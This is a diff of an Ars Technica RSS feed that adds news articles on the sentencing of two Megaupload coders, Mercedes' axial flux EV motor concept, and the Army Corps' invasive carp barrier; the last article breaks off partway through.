@@ -12,7 +12,7 @@
 	<atom:link href="https://arstechnica.com/feed/?t=c951724f17882c293435a61d10002d8b" rel="self" type="application/rss+xml" />
 	<link>https://arstechnica.com</link>
 	<description>Serving the Technologist for more than a decade. IT news, reviews, and analysis.</description>
-	<lastBuildDate>Wed, 14 Jun 2023 22:23:48 +0000</lastBuildDate>
+	<lastBuildDate>Thu, 15 Jun 2023 16:51:49 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -28,7 +28,451 @@
 	<height>32</height>
 </image> 
 	<item>
-		<title>For the first time in decades, Congress seems interested space-based solar power</title>
+		<title>Megaupload coders avoid 10-year sentences by testifying against Kim Dotcom</title>
+		<link>https://arstechnica.com/?p=1948120</link>
+					<comments>https://arstechnica.com/tech-policy/2023/06/megaupload-coders-get-light-sentences-will-testify-against-kim-dotcom/#comments</comments>
+		
+		<dc:creator><![CDATA[Ashley Belanger]]></dc:creator>
+		<pubDate>Thu, 15 Jun 2023 16:28:35 +0000</pubDate>
+				<category><![CDATA[Policy]]></category>
+		<category><![CDATA[Kim Dotcom]]></category>
+		<category><![CDATA[megaupload]]></category>
+		<guid isPermaLink="false">https://arstechnica.com/?p=1948120</guid>
+
+					<description><![CDATA[Dotcom doesn’t blame Megaupload coders for striking deal with US government.]]></description>
+										<content:encoded><![CDATA[
+<figure class="intro-image intro-left">
+  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/GettyImages-489715596-800x545.jpg" alt="Megaupload executives Mathias Ortmann (L) and Bram van der Kolk (R) are seen in court during an extradition hearing in Auckland on September 24, 2015."/>
+      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/GettyImages-489715596.jpg" class="enlarge-link" data-height="697" data-width="1024">Enlarge</a> <span class="sep">/</span> Megaupload executives Mathias Ortmann (L) and Bram van der Kolk (R) are seen in court during an extradition hearing in Auckland on September 24, 2015. (credit: <a rel="nofollow" class="caption-link" href="https://www.gettyimages.com/detail/news-photo/megaupload-executives-mathias-ortmann-and-bram-van-der-kolk-news-photo/489715596">MICHAEL BRADLEY / Stringer | AFP</a>)</p>  </figure>
+
+
+
+
+
+
+<div><a name='page-1'></a></div>
+<p>Two Megaupload coders were sentenced to prison in New Zealand yesterday after pleading guilty to fraud and promising to testify against former Megaupload CEO Kim Dotcom, the <a href="https://www.nzherald.co.nz/nz/megaupload-coders-sentenced-to-prison-after-home-detention-bid-denied/OACYX734XREW3KPA6N5LWKLHYM/">New Zealand Herald reported</a>.</p>
+<p>Mathias Ortmann, a former chief technology officer who held 25 percent of Megaupload shares, was sentenced to two years and seven months. Bram van der Kolk, who led Megaupload software programming and held 2.5 percent of Megaupload shares, was sentenced to two years and six months.</p>
+<p>Ars could not immediately reach Ortmann's and van der Kolk's lawyers to comment. The High Court in Auckland did not immediately respond to Ars' request to review the judgment.</p>
+<p>According to the Herald, Justice Sally Fitzgerald downgraded the coders' sentences from 10 years to current sentences due to "guilty pleas, assistance to the FBI, and rehabilitation efforts."</p>
+<p>The deals will allow the coders to serve these significantly lighter sentences than expected in New Zealand rather than being extradited to the United States. Dotcom is still fighting extradition to the US.</p>
+<p>In response to sentencing, <a href="https://twitter.com/KimDotcom/status/1669203088224452608?cxt=HHwWgIDUua3XmaouAAAA">Dotcom tweeted</a> that "the conclusion from these light sentences should be" not to extradite him to the US "to face 185 years in jail."</p>
+<p>"My legal team says that my co-defendants in the Megaupload case are eligible for parole after 10 months and will likely get parole as part of the deal they made with the US," <a href="https://twitter.com/KimDotcom/status/1669214546131849218?cxt=HHwWhMDUwaXynqouAAAA">Dotcom tweeted</a>. "They will serve less than a year instead of the 185 years we were charged with. Good for them."</p>
+<p>Dotcom also <a href="https://twitter.com/KimDotcom/status/1669203006242562048?cxt=HHwWgIDR0crSmaouAAAA">suggested</a> that the coders' sentence could "be converted to home detention in a few months," calling the sentences "a slap on the wrist."</p>
+<p>Ars could not immediately reach Dotcom for comment, but his tweet thread also <a href="https://twitter.com/KimDotcom/status/1669218419621900289?cxt=HHwWgsDRoeHToKouAAAA">claimed</a> that he considered "the best part" of this week's sentencing was that it seemed to contradict US government statements deeming the Megaupload case “the biggest copyright case in history.”</p>
+<p>"My co-defendants were not sentenced for copyright crimes, but for ‘fraud,’" Dotcom tweeted. "No copyright infringement."</p>
+<p>Both Ortmann and van der Kolk have briefly deferred the start of their prison sentences until August 1. The former requested to be present for the birth of his child, and the latter requested to spend time with his "seriously ill" mother, the Herald reported.</p>
+<h2>Dotcom: Coders “have been through hell”</h2>
+<p>Dotcom <a href="https://twitter.com/KimDotcom/status/1669203083006730241?cxt=HHwWgoDTyYbXmaouAAAA">tweeted</a> that he doesn't blame Ortmann and van der Kolk for striking deals with the US government.</p>
+<p>"They have been through hell," Dotcom tweeted.</p>
+<p>The sentencing comes 11 years after their arrest and Megaupload's forced shutdown after an FBI raid dismantled the site for attracting 4 percent of Internet traffic by providing "easy access to copyrighted films, music, television shows, and video games," the Herald reported.</p>
+<p>The scheme allegedly cost rights holders more than half a billion dollars, and Fitzgerald said it was clear to the court that Ortmann and van der Kolk helped Megaupload in its "deliberate attempt to disguise the copyright infringement," the Herald reported. The pair pled guilty to participating in this fraud.</p>
+<div><a name='page-2'></a></div>
+<p>Ars covered nearly every twist and turn of the <a href="https://arstechnica.com/series/series-megaupload/">Megaupload controversy</a> over the past decade. Throughout the saga, Dotcom has fought extradition while attempting to stay in business as a New Zealand judge deemed the FBI raid a "<a href="https://arstechnica.com/tech-policy/2013/05/kim-dotcom-raid-yielded-miscarriage-of-justice-nz-judge-rules/">miscarriage of justice</a>;" Dotcom <a href="https://arstechnica.com/tech-policy/2013/09/kim-dotcom-sues-new-zealand-for-7-million-over-illegal-spying-raid/">sued New Zealand</a> over illegal spying; a judge <a href="https://arstechnica.com/tech-policy/2014/02/new-zealand-appeals-court-reverses-ruling-that-megaupload-warrants-were-illegal/">reversed the ruling</a> that the FBI raid was illegal; Dotcom <a href="https://arstechnica.com/tech-policy/2014/11/kim-dotcom-im-officially-broke-after-transferring-remaining-assets/">declared he was broke</a>; new <a href="https://arstechnica.com/tech-policy/2017/08/new-zealand-illegally-spied-on-dotcom-associates-court-rules/">spying revelations emerged</a>; and Dotcom twice <a href="https://arstechnica.com/tech-policy/2016/07/kim-dotcom-to-reboot-megaupload/">relaunched Megaupload</a>.</p>
+<p>The courtroom was packed at this week's sentencing, the Herald reported, as the coders' lawyer, Grant Illingworth QC, argued that his clients made a "poor decision" participating in the Megaupload scheme. Illingworth said both coders had since worked hard to show remorse for their crimes and rehabilitate through their honest business effort, a cloud storage business called <a href="https://careers.mega.nz/people/608019-mathias-ortmann">Mega</a>.</p>
+<p>The judge was asked to consider that Mega has remained "fully compliant" with the law and now has 200 employees and more than 280 million users. These stakeholders could all be negatively affected if Ortmann and van der Kolk served prolonged sentences and the company collapsed, Illington said.</p>
+<p>“To apply a heavily punitive penalty would send the wrong message," Illington argued. "Others should be encouraged to follow the example they have set over the last decade of their lives.”</p>
+<p>Representing the New Zealand Crown, prosecutor David Boldt pushed back on this characterization, according to the Herald. Boldt argued that Ortmann and van der Kolk "were central" to Megaupload's copyright-infringing operation, which he described as "the most serious" worldwide "criminal conspiracy" that "is possible to imagine."</p>
+<p>“This fraud dwarfs anything seen in New Zealand before," Boldt said. "Even the illicit revenues Megaupload generated amounted to around $300 million.”</p>
+<p><a href="https://twitter.com/KimDotcom/status/1669203083006730241?cxt=HHwWgoDTyYbXmaouAAAA">Dotcom tweeted</a> that Ortmann and van der Kolk struck deals "not because they actually believe that they are criminals" but because "they were tired of fighting and gave up in exchange for a 98.5 percent discount of the 185 years we were charged with" in the US.</p>
+<p>As part of the deals, Ortmann and van der Kolk agreed to testify against Dotcom and "others charged in the Megaupload case."</p>
+<p>Ars could not immediately reach Illington for comment.</p>
+<p>The 2012 FBI raid originally resulted in extradition attempts on Ortmann and van der Kolk, as well as Dotcom and Megaupload marketing director Finn Batato, who died of cancer last year, the <a href="https://www.nzherald.co.nz/nz/kim-dotcom-pays-tribute-to-megaupload-marketing-director-finn-batato-who-has-died-after-cancer-battle/ESI7YDUT4JBFYIWL25NSTTSE7E/">New Zealand Herald reported</a>.</p>
+<p>Dotcom has remained supportive of his remaining co-defendants, even as they stand to testify against him. Now, he remains the top Megaupload target for the US Department of Justice.</p>
+<p>"My fight goes on," Dotcom said, according to <a href="https://www.reuters.com/world/asia-pacific/new-zealand-court-sentences-megaupload-coders-prison-report-2023-06-15/">Reuters</a>.</p>
+
+<p><a href="https://arstechnica.com/?p=1948120&comments=1">Read Comments</a></p>]]></content:encoded>
+					
+					<wfw:commentRss>https://arstechnica.com/tech-policy/2023/06/megaupload-coders-get-light-sentences-will-testify-against-kim-dotcom/feed/</wfw:commentRss>
+			<slash:comments>12</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Mercedes-Benz showcases axial flux EV motor in One-Eleven concept car</title>
+		<link>https://arstechnica.com/?p=1947992</link>
+					<comments>https://arstechnica.com/cars/2023/06/mercedes-benz-showcases-axial-flux-ev-motor-in-one-eleven-concept-car/#comments</comments>
+		
+		<dc:creator><![CDATA[Jonathan M. Gitlin]]></dc:creator>
+		<pubDate>Thu, 15 Jun 2023 14:00:06 +0000</pubDate>
+				<category><![CDATA[Cars]]></category>
+		<category><![CDATA[axial flux]]></category>
+		<category><![CDATA[axial flux motor]]></category>
+		<category><![CDATA[electric motor]]></category>
+		<category><![CDATA[Mercedes 111]]></category>
+		<category><![CDATA[Mercedes One-Eleven]]></category>
+		<category><![CDATA[Mercedes-Benz]]></category>
+		<category><![CDATA[Mercedes-Benz Vision EQXX]]></category>
+		<category><![CDATA[Mercedes-Benz Vision One-Eleven]]></category>
+		<category><![CDATA[new mercedes EV]]></category>
+		<category><![CDATA[Orange]]></category>
+		<category><![CDATA[Yasa]]></category>
+		<category><![CDATA[Yasa motor]]></category>
+		<guid isPermaLink="false">https://arstechnica.com/?p=1947992</guid>
+
+					<description><![CDATA[The new electric motor is a third the size and mass of a conventional EV motor.]]></description>
+										<content:encoded><![CDATA[
+<figure class="intro-image intro-left">
+  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mercedes-One-Eleven-1-800x600.jpg" alt="An orange Mercedes concept car next to an orange background. There's some dry ice fog behind it"/>
+      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mercedes-One-Eleven-1-scaled.jpg" class="enlarge-link" data-height="1920" data-width="2560">Enlarge</a> <span class="sep">/</span> Formula 1 battery tech and light, compact, but powerful electric motors would power the Mercedes-Benz Vision One-Eleven. (credit: Jonathan Gitlin)</p>  </figure>
+
+
+
+
+
+
+<div><a name='page-1'></a></div>
+<aside class="pullbox sidebar fullwidth">Mercedes-Benz provided a flight from DC to San Diego and a return from Los Angeles, plus four nights' hotels so we could meet the Vision One-Eleven as well as drive a new Mercedes-AMG plug-in hybrid and a new battery electric vehicle. You'll be able to read those first-drive reports on June 27 and July 11. Ars does not accept paid editorial content.</aside>
+<p>CARLSBAD, CALIF.—In 1969, a couple of short months after humans first walked on the surface of the moon, Mercedes-Benz debuted a revolutionary new concept car at that year's Frankfurt auto show. Called the C111, this orange-and-black coupe featured dramatic gullwing doors but also served as a testbed for new technology, including a four-rotor Wankel rotary engine. Now, 54 years later, it has drawn inspiration from that car for its newest concept, the Vision One-Eleven. It, too, is orange, and it also showcases new technology—in this case, very small and lightweight axial flux electric motors.</p>
+<p>Axial flux motors aren't exactly new—most optical drives use them, for example, but they're not very common in automotive applications. The one-off <a href="https://arstechnica.com/cars/2022/04/driving-the-jeep-magneto-an-electric-concept-with-a-manual-transmission/">Jeep Magneto</a> used axial flux motors, as do production hybrid supercars from <a href="https://arstechnica.com/cars/2020/03/1200-uncomfortable-miles-in-a-gorgeous-acura-nsx-hybrid-supercar/">Acura</a>, <a href="https://arstechnica.com/cars/2022/06/driving-mclarens-new-plug-in-hybrid-supercar-the-2023-artura/">McLaren</a>, and <a href="https://arstechnica.com/cars/2022/12/the-2023-ferrari-296-gts-we-drive-ferraris-plug-in-hybrid-convertible/">Ferrari</a>. In the case of the Italian OEM, it sources the motors from Yasa, a British company that was <a href="https://www.ft.com/content/4dd01709-cf31-4e13-8876-f8f7ab148149">acquired by Mercedes in 2021</a>.</p>
+<p>Like the much more common radial flux motor, an axial flux motor uses magnets (in this case, permanent magnets), soft iron to transport the flux, copper as the material that's connected to the inverter, and an aluminum housing.</p>
+  <ul class="gallery shortcode-gallery gallery-wide">
+          <li>
+        <div class="gallery-item-content">
+          <div class="gallery-image"><img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Axial-flux-vs-radial-flux-motors-980x551.jpg" alt=""></div>
+          <p>
+            An exploded diagram of an axial flux electric motor (left) and a radial flux electric motor (right).                          [credit:
+                              Mercedes-Benz                            ]
+                      </p>
+        </div>
+      </li>
+      </ul>
+
+<p>"However, that's where the similarity ends," said Tim Woolmer, who founded Yasa in 2009 to commercialize his PhD research. "So in a radial flux machine, the flux travels out from the permanent magnets into the stator, around the stator yoke and then it drops back into the rotor forming a loop. So the flux in the airgap is traveling radially, hence the name "radial flux machine," he explained.</p>
+<p>"On the axial flux machine with two discs and one stator, the flux in this case basically travels from rotor to rotor straight through the stator, then travels around the back steel in the rotor and then back again through the stator through a different coil," Woolmer said.</p>
+<div><a name='page-2'></a></div>
+<p>Woolmer's PhD involved a soft magnetic composite material—in Yasa's motor, this lives in segments, bound in copper coils, within the stator. He took that approach initially because of the difficulty of compressing the composite material together into large enough pieces. Making a whole motor stator in the same way one would for a radial flux motor would have required a 4,000-ton press. Instead, the smaller pieces only needed 210 tons of pressure.</p>
+  <ul class="gallery shortcode-gallery gallery-wide">
+          <li>
+        <div class="gallery-item-content">
+          <div class="gallery-image"><img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mercedes-One-Eleven-4-980x735.jpg" alt=""></div>
+          <p>
+            Gullwing doors are a bit of a Mercedes trademark.                           [credit:
+                              Jonathan Gitlin                            ]
+                      </p>
+        </div>
+      </li>
+      </ul>
+
+<p>"And that's really when the eureka moment happened," he told Ars. "Because the flux goes straight through the stator and then around in the rotor and then back again through the stator... you don't need, magnetically, the stator yoke at all." The yokeless and segmented armature design also lent Yasa its name.</p>
+<p>Yasa's axial flux motors are a third the size and mass of an equivalently powerful radial flux motor, and in 2015, six of them had a combined output of 1 megawatt, sufficient power <a href="https://arstechnica.com/cars/2015/07/1-megawatt-electric-car-sets-a-new-record-at-pikes-peak-hillclimb/">to take Rhys Millen to the top of Pikes Peak in what was then a record</a>. And the technology proved perfect for Ferrari when it went looking for an electric motor that could fit between the engine and gearbox in its SF90 hypercar.</p>
+<p>"Ferrari had a really interesting problem, which is, for center of gravity reasons, they want their crank height to be as low as possible, so they only had 105 millimeters of radius on the machine," Woolmer said. "And they also only had about 65 millimeters of axial length—any more and the car got longer. So they had literally a package volume of about two, two and a half liters to fit."</p>
+<div class="image shortcode-img center"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mercedes-One-Eleven-6-scaled.jpg"><img alt='The seats are fixed, and the controls come to the driver.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mercedes-One-Eleven-6-980x735.jpg" alt='The seats are fixed, and the controls come to the driver.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mercedes-One-Eleven-6-scaled.jpg"class="caption-link" rel="nofollow">The seats are fixed, and the controls come to the driver.</a> (credit: Jonathan Gitlin)</p></div>
+<p>Mercedes is happy to continue supplying Yasa motors to Ferrari and other specialized OEMs, but it bought the company to use the technology itself, which brings us back to the Vision One-Eleven. If the car that inspired it was created originally to test out new powertrain ideas, then so, too, does this new one, which imagines an axial flux motor for each rear wheel and a battery pack using the same chemistry as the cells you'd find inside Lewis Hamilton's Formula 1 car.</p>
+<p>At least you would if the powertrain was feature-complete, <a href="https://arstechnica.com/cars/2022/07/we-test-an-electric-mercedes-that-can-can-go-747-miles-on-a-single-charge/">like the hyper-efficient EQXX we drove last summer</a>. We'll see a production version of that concept's powertrain in the brand's next EV architecture, due to appear in a cheaper Mercedes EV in 2024. The ideas that the Vision One-Eleven imagines are a little farther away; however, Mercedes isn't at the point where it will announce an all-electric sports car going into production.</p>
+<p>The concept doesn't just imagine a new high-performance EV powertrain. The user interface features augmented reality, demoed to us with the help of a Magic Leap headset. A 3D map can extend out into space from the infotainment screen, for instance, or AR could render parts like the A pillar or door transparent to the driver, removing blind spots. They're impressive ideas, assuming the tech matures to the point it's actually feasible.</p>
+<div><a name='page-3'></a></div>
+<div class="image shortcode-img center"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mercedes-One-Eleven-augmented-reality-interior-concept-scaled.jpg"><img alt='The One-Eleven imagines an augmented-reality human-machine interface.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mercedes-One-Eleven-augmented-reality-interior-concept-980x551.jpg" alt='The One-Eleven imagines an augmented-reality human-machine interface.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/Mercedes-One-Eleven-augmented-reality-interior-concept-scaled.jpg"class="caption-link" rel="nofollow">The One-Eleven imagines an augmented-reality human-machine interface.</a> (credit: Mercedes-Benz)</p></div>
+<p>At least alone in a sports car <a href="https://arstechnica.com/gadgets/2023/06/five-ways-vision-pro-is-different-from-anything-apple-or-anyone-has-ever-made/3/">you'd probably look less dorky wearing AR goggles than wearing them in many other places</a>, though <a href="https://arstechnica.com/cars/2021/01/ti-shows-a-holographic-instrument-display-for-car-windshields-at-ces/">augmented-reality windshields</a> are <a href="https://arstechnica.com/cars/2023/01/bmw-is-developing-a-full-screen-heads-up-display-for-2025s-neue-klasse/">approaching reality,</a> so it's equally likely no headsets will be required.</p>
+<p>Meanwhile, axial flux motors might start appearing in production Mercedes EVs toward the end of the decade. "In particular, when you look into the motor, if it gets smaller and smaller, more and more powerful, and lighter, you don't have to occupy the center of a vehicle any longer," said Konstantin Neiss, who's in charge of Mercedes' electric drive unit development.</p>
+<p>Moving the motors closer to the driven wheels would free up internal space, which might be used for more battery or more cargo volume. The much smaller mass and size of an axial flux motor may even result in an EV with hub-mounted motors; I've grown old waiting for one of those to make it past the prototype stage using radial flux motors.</p>
+
+<p><a href="https://arstechnica.com/?p=1947992&comments=1">Read Comments</a></p>]]></content:encoded>
+					
+					<wfw:commentRss>https://arstechnica.com/cars/2023/06/mercedes-benz-showcases-axial-flux-ev-motor-in-one-eleven-concept-car/feed/</wfw:commentRss>
+			<slash:comments>68</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Inside the battle to build a $1.2 billion fish barricade</title>
+		<link>https://arstechnica.com/?p=1948058</link>
+					<comments>https://arstechnica.com/science/2023/06/inside-the-battle-to-build-a-1-2-billion-fish-barricade/#comments</comments>
+		
+		<dc:creator><![CDATA[Undark Magazine]]></dc:creator>
+		<pubDate>Thu, 15 Jun 2023 13:40:07 +0000</pubDate>
+				<category><![CDATA[Features]]></category>
+		<category><![CDATA[Science]]></category>
+		<category><![CDATA[asian carp]]></category>
+		<category><![CDATA[environment]]></category>
+		<category><![CDATA[Invasive species]]></category>
+		<guid isPermaLink="false">https://arstechnica.com/?p=1948058</guid>
+
+					<description><![CDATA[The Army Corps of Engineers aims to block invasive carp from the Great Lakes.]]></description>
+										<content:encoded><![CDATA[
+<figure class="intro-image intro-left">
+  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/asian-carp-800x450.jpg" alt="Close up of Asian Carp"/>
+      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/asian-carp.jpg" class="enlarge-link" data-height="1080" data-width="1920">Enlarge</a> <span class="sep">/</span> Top: An invasive carp collected during scheduled fish sampling at the Wilmington Substation.  (credit: <a rel="nofollow" class="caption-link" href="https://flickr.com/photos/acrcc/32785815614">USFWS</a>)</p>  </figure>
+
+
+
+
+
+
+<div><a name='page-1'></a></div>
+<p>Over the past 50-some years, invasive carp, a stunningly destructive invasive species, have infested almost every waterway in the Midwest, from South Dakota to beyond the Mississippi Delta, and have even reached West Virginia. In some waters, it has been <a href="https://www.theleafchronicle.com/story/news/local/clarksville/2020/02/17/asian-carp-how-bright-new-idea-became-invasive-fish-nightmare/4786152002/">reported</a> that around 90 percent of the fish are invasive carp; in one section of the Illinois River, a Mississippi tributary, they make up more than 75 percent of the total biomass in the water. They are obnoxious invaders, overwhelming other fish species, muddying clear waters, and—in some cases—jumping out of the water when startled. A passing boat can throw hundreds of fish into a frenzy, creating an <a href="https://youtu.be/nc-e8EGkLMo">airborne blizzard</a> of 25-pound lunkers that have broken the arms and jaws of recreational boaters.</p>
+<p>So far, however, the prolific fish have mostly stopped short of the Great Lakes, blocked by the subtle ridge of a continental divide that circles the lakes’ southern and western shores. Water to the west and south of the ridge flows to the Mississippi River and the Gulf of Mexico. Water to the east and north flows to the Great Lakes, which contain about 20 percent of the world’s surface fresh water and attract boating, fishing, and other recreation, which all together have been estimated to generate between $14 billion and $42 billion a year.</p>
+<p>But the fish, formerly called Asian carp, could still find a way in. There is a single year-round connection between those two main watersheds of eastern North America: the Chicago Sanitary and Ship Canal.</p>
+<p>The canal opened to commercial shipping in 1900, and an extension was built seven years later; among the unintended consequences was the creation of a route for invasive species like the carp to move into vast new territories. It connects Lake Michigan and the Chicago River to the Des Plaines River, which pours into the Illinois River, which is lousy with invasive carp.</p>
+<p>At the Brandon Road Lock and Dam, south of Joliet, Illinois, below where the canal and Des Plaines River meet, there is a choke point, a 110-foot wide channel and lock through which the carp must pass to get to the Great Lakes. There, the Army Corps of Engineers is mustering about $1.2 billion taxpayer dollars to build a barrier that will, hypothetically, stop the carp from getting to the lakes.<!--adbreak--></p>
+<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-1.jpg"><img alt='At a 2018 meeting, the Army Corps briefed congressional staff on the project to build a barrier at the Brandon Road Lock and Dam. The project has ballooned to roughly $1.2 billion in estimated costs.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-1-640x427.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-1-1280x853.jpg 2x" alt='At a 2018 meeting, the Army Corps briefed congressional staff on the project to build a barrier at the Brandon Road Lock and Dam. The project has ballooned to roughly $1.2 billion in estimated costs.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-1.jpg"class="caption-link" rel="nofollow">At a 2018 meeting, the Army Corps briefed congressional staff on the project to build a barrier at the Brandon Road Lock and Dam. The project has ballooned to roughly $1.2 billion in estimated costs.</a> (credit: <a rel="nofollow" class="caption-link" href="https://flickr.com/photos/usacechicago/43040015412">Patrick Bray/US Army</a>)</p></div>
+<p>Experts say that keeping the fish out is worth the price. “It would be a cataclysmic event,” said Greg McClinchey, legislative affairs and policy director of the <a href="http://www.glfc.org/">Great Lakes Fishery Commission</a>, contemplating the arrival of invasive carp in the lakes. “As expensive as any project might be, the cost of failure is much higher.” (The commission is also working with partners in Ohio to control invasive grass carp that have established a small breeding population in the <a href="https://www.cleveland.com/news/2022/10/going-after-grass-carp-in-lake-erie-now-before-its-too-late.html">Lake Erie watershed</a>, but these fish are not as big of a threat as other invasive carp species.)</p>
+<p>What is officially called the Brandon Road Interbasin Project is, in effect, the Great Lakes’ last line of defense. It will be a gauntlet of barriers that will take years to install and use a variety of technologies, from electric shocks to curtains of bubbles, to inflict sufficient discomfort on the advancing carp that they may turn around and leave the Great Lakes alone.</p>
+<p>“I have great hope that the technologies will work,” said Molly Flanagan, chief operating officer of the nonprofit <a href="https://greatlakes.org/">Alliance for the Great Lakes</a>. “One open question is whether we can build them fast enough.”</p>
+<p>There are four types of invasive carp: bighead, silver, grass, and black. Although the exact date of the invasive carp’s introduction is unclear, the fish were deliberately introduced into the United States, possibly in the early 1960s, first as a sport fish and then, improbably, as the solution to an environmental problem: the heavy use of herbicides to clear weeds from catfish farms in the Mississippi Delta. The bottom feeding carp would root up weeds and consume floating algae.</p>
+<p>“The understanding was that there was no way these fish could reproduce in this environment,” said Brian Schoenung, the aquatic nuisance species program manager for the Illinois Department of Natural Resources. “It was a great way to cut back the chemicals.”</p>
+<p>In the early 1970s, flooding liberated thousands of the imported carp from the catfish ponds, washing them into tributaries of the Mississippi. It turns out that they reproduced in American waters just fine, and they soon wreaked havoc on the waterways and native species. “It is the <a href="https://undark.org/2021/05/12/how-to-poison-a-feral-pig/">pig</a> of the fish world,” wrote outdoor writer Mark C. Dilts of the carp, “rooting around in a weed bed, which it will eventually destroy as habitat for other fish. Its plowing around on bottom muddies the water so sunlight cannot penetrate to stimulate future plant growth.”</p>
+<div><a name='page-2'></a></div>
+<div class="video"><div class="wrapper"<iframe style="display:block" type="text/html" width="640" height="360" src="https://www.youtube.com/embed/x3Bf0WhvsNk?start=0&wmode=transparent" frameborder="0" allowfullscreen></iframe></div><p class="caption" style="font-size:0.8em">When startled, silver carp jump out of the water—the only one of the four species under the umbrella of invasive carp to do so. A passing boat can create an airborne blizzard of 25-pound lunkers that have broken the arms and jaws of recreational boaters. </p></div>
+<p>Before the passage of the federal Clean Water Act in 1972, transit of invasive species through the Chicago Sanitary and Ship Canal wasn’t an issue. The roughly 30-mile passage—which, when it was built, reversed the flow of the Chicago River so the city’s sewage would flow south rather than out into the city’s drinking water in Lake Michigan—was so polluted fish couldn’t survive in it. But the act, more or less, cleaned up American waterways and lowered pollution in the canal sufficiently that a few hardy species started to appear.</p>
+<p>Among the fish moving into the canal was the <a href="https://nas.er.usgs.gov/queries/factsheet.aspx?SpeciesID=713">round goby</a>, an aggressive and voracious Eurasian native that came to the Great Lakes in the bilgewater—water pumped out of a ship’s hull—of oceangoing freighters.</p>
+<p>Looking for a way to keep the round goby from spreading into the Mississippi River basin, experts considered dozens of possible solutions, including the introduction of “biological pathogens” into the ecosystem, using superheated water from power plants to make the fish uncomfortable, poisoning the waterways, and just plain shutting the canal down. In 1996, Congress authorized the Army Corps to develop a fish barrier, and the Corps’ advisory panel settled on building something reminiscent of the invisible fences that contain dogs in backyards: a barrier that would use electrical pulses to convince the fish to turn back.</p>
+<p>The Army Corps identified a location near the town of Romeoville, Illinois, for the construction of the first barrier. Inconveniently, the goby turned up well downstream of the Romeoville site just as the project started. On the assumption that some variation of the same problem was going to pop up in the future, the project was changed from a deployment aimed at one species to a testbed to see how electric pulses would work on a broader range of fish.<!--adbreak--></p>
+<p>During the study period, scientists tagged and planted 130 common, locally captured carp in the canal. They monitored the carp to see how they reacted to the electrical pulses. (And, by sheer chance, to see how human beings reacted as well. One barge crew, despite warning signs, tried to tie up near the facility using metal cable. The connection threw a 12-inch spark, which could have blown the barge up had it been carrying more volatile cargo.)</p>
+<p>Only one fish made it past the electrodes during the test, apparently as a hitchhiker in the space between barges as they pushed up the canal. Also of concern was the fact that the system experienced, as electrical systems often do, periodic outages, the longest of which was 56 hours, long enough to let whole schools of fish through.</p>
+<p>When the test ended, observers from the American Fisheries Society, a nonprofit organization for fisheries professionals, concluded, “The electric barrier is at best a partial solution.” While the <a href="https://ilrdss.isws.illinois.edu/pubs/govconf2005/session4c/Chuck%20Shea.pdf">final report</a> from the operators of the barrier called their work “reliable technology to repel fish without killing them,” it also suggested that further implementation might benefit from the inclusion of other types of deterrents, including air bubbles and sound, to repel fish.</p>
+<p>For more than 30 years, the Army Corps and its partners have been contemplating and experimenting with different kinds of barriers to keep invasive carp out of Lake Michigan. During that time, there have been scares. <a href="https://undark.org/2020/03/11/environmental-dna-asian-carp/">Invasive carp DNA</a> seems ever-present in the canal and even in the lake itself, and has so far been traced to benign sources. But more recently, in August 2022, a fisherman <a href="https://news.wttw.com/2022/08/06/invasive-carp-captured-lake-calumet-just-7-miles-lake-michigan">reported</a> a silver carp in Lake Calumet on the upstream side of Brandon Road Lock and Dam, only seven miles from Lake Michigan. The nightmare was that the carp had, like the round goby before it, bypassed the barrier being built to stop it.</p>
+<p>In response, government agents launched a fleet of small boats in search of the carp—which they caught—and to see if there were others. After a couple of weeks and no additional carp found, everyone heaved a sigh of relief.</p>
+<p>“Every time that happens, I think it’s like a siren going off to remind us we’re at risk,” said Flanagan. “We shouldn’t ignore it when we find a single fish,” she added. “Every time we should pay attention and know that we need to get these protections in place.”</p>
+<div><a name='page-3'></a></div>
+<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-2.jpg"><img alt='Adult and juvenile silver carp. In August 2022, a fisherman reported a silver carp on the upstream side of Brandon Road Lock and Dam, only seven miles from Lake Michigan.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-2-640x427.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-2-1280x853.jpg 2x" alt='Adult and juvenile silver carp. In August 2022, a fisherman reported a silver carp on the upstream side of Brandon Road Lock and Dam, only seven miles from Lake Michigan.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-2.jpg"class="caption-link" rel="nofollow">Adult and juvenile silver carp. In August 2022, a fisherman reported a silver carp on the upstream side of Brandon Road Lock and Dam, only seven miles from Lake Michigan.</a> (credit: <a rel="nofollow" class="caption-link" href="https://flickr.com/photos/acrcc/47119388444">Katie Steiger-Meister/USFWS</a>)</p></div>
